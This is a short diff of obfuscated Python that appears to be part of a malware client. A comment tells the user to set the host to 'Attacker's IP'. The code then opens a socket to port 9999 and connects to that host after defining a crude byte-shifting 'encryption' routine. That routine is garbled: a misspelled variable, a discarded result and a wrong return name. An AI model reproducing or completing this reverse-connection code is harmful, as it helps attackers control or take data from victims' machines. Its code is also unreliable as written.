@@ -12,7 +12,7 @@ def modify (OOOOO00O0O0OO00OO ):#line:11
  for O0OO000000OO000OO in encryprt: #line:14
    O0OO000000OO000OO <<24 #line:15
  return encrypt #line:16
-host ='172.20.10.2'#line:18
+host ='' #change to Attacker's IP 
 port =9999 #line:20
 s =socket .socket ()#line:22
 s .connect ((host ,port ))#line:23
